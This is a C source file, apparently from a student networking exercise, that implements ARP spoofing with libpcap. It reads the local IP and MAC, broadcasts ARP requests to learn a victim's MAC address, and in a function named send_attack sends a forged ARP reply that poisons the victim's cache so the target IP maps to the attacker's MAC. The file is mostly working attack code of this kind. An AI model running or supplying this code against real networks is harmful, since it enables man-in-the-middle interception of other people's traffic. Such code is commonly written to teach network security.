#include "send-arp.h"
#include <stdio.h>
#include <arpa/inet.h>
#include <string.h>
#include <unistd.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>

bool get_my_ip(const char* dev, uint32_t* my_ip) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0); 
    if (fd < 0){
        printf("couldn't create socket\n");
        return false;
    }

    // dev(waln0)
    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1); 
    ifr.ifr_name[IFNAMSIZ - 1] = '\0'; 

    // IP
    if (ioctl(fd, SIOCGIFADDR, &ifr) < 0) { // interface address
        printf("fail ioctl\n");
        close(fd);
        return false;
    } 
    close(fd);

    struct sockaddr_in* ipaddr = (struct sockaddr_in*)&ifr.ifr_addr; //IPv4
    *my_ip = ipaddr->sin_addr.s_addr;
    return true;
}

bool get_my_mac(const char* dev, uint8_t* my_mac) {
    int fd;
    struct ifreq ifr;

    fd = socket(AF_INET, SOCK_DGRAM, 0);
    if (fd < 0){
        printf("couldn't create socket\n");
        return false;
    }

    strncpy(ifr.ifr_name, dev, IFNAMSIZ - 1);
    ifr.ifr_name[IFNAMSIZ - 1] = '\0';

    if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0) { // hardware address
        printf("fail ioctl\n");
        close(fd);
        return false;
    } 
    close(fd);

    memcpy(my_mac, ifr.ifr_hwaddr.sa_data, 6);
    return true;
}

bool get_sender_mac(pcap_t* handle, uint32_t my_ip, const uint8_t* my_mac, uint32_t sender_ip, uint8_t* sender_mac) {
    EthArp_packet packet;
    uint8_t broadcast_mac[6] = {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF};
    uint8_t zero_mac[6] = {0x00, 0x00, 0x00, 0x00, 0x00, 0x00};

    memcpy(packet.eth_.dmac, broadcast_mac, 6);
    memcpy(packet.eth_.smac, my_mac, 6);
    packet.eth_.type = htons(ETHTYPE_ARP);

    packet.arp_.htype = htons(1);
    packet.arp_.ptype = htons(ETHTYPE_IP);
    packet.arp_.hlen = 6;
    packet.arp_.plen = 4;
    packet.arp_.op = htons(ARPOP_REQUEST);
    memcpy(packet.arp_.smac, my_mac, 6);
    packet.arp_.sip = my_ip;
    memcpy(packet.arp_.tmac, zero_mac, 6);
    packet.arp_.tip = sender_ip;

    for (int i = 0; i < 5; i++) { // reply 못 받는 경우가 많아 횟수를 5로
        int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(EthArp_packet));
        if (res != 0) {
            fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
            return false;
        }
    } 

    while (1) {
        struct pcap_pkthdr* header;
        const u_char* recv_packet;
        int res = pcap_next_ex(handle, &header, &recv_packet);

        if (res == 0) continue;
        if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
            printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(handle));
            return false;
        }

        if (header->caplen < sizeof(EthArp_packet)) continue;

        Eth_hdr* eth = (Eth_hdr*)recv_packet;
        if (ntohs(eth->type) == ETHTYPE_ARP) {
            Arp_hdr* arp = (Arp_hdr*)(recv_packet + sizeof(Eth_hdr));
            if (arp->sip == sender_ip && ntohs(arp->op) == ARPOP_REPLY && arp->tip == my_ip) {
                memcpy(sender_mac, arp->smac, 6);
                return true;
            }
        }
    }

    return false;
}

void send_attack(pcap_t* handle, const uint8_t* my_mac, uint32_t target_ip, const uint8_t* sender_mac, uint32_t sender_ip) {
    EthArp_packet packet;

    memcpy(packet.eth_.dmac, sender_mac, 6);
    memcpy(packet.eth_.smac, my_mac, 6);
    packet.eth_.type = htons(ETHTYPE_ARP);

    packet.arp_.htype = htons(1);
    packet.arp_.ptype = htons(ETHTYPE_IP);
    packet.arp_.hlen = 6;
    packet.arp_.plen = 4;
    packet.arp_.op = htons(ARPOP_REPLY);

    memcpy(packet.arp_.smac, my_mac, 6);
    packet.arp_.sip = target_ip;
    memcpy(packet.arp_.tmac, sender_mac, 6);
    packet.arp_.tip = sender_ip;

    int res = pcap_sendpacket(handle, (const u_char*)&packet, sizeof(EthArp_packet));
    if (res != 0) {
    fprintf(stderr, "pcap_sendpacket error=%s\n", pcap_geterr(handle));
    }
}

const char* mac_to_str(const uint8_t* mac, char* mac_str, size_t mac_str_size) {
    if (mac_str_size < 18) return NULL;
    snprintf(mac_str, mac_str_size, "%02x:%02x:%02x:%02x:%02x:%02x", mac[0], mac[1], mac[2], mac[3], mac[4], mac[5]);

    return mac_str;
}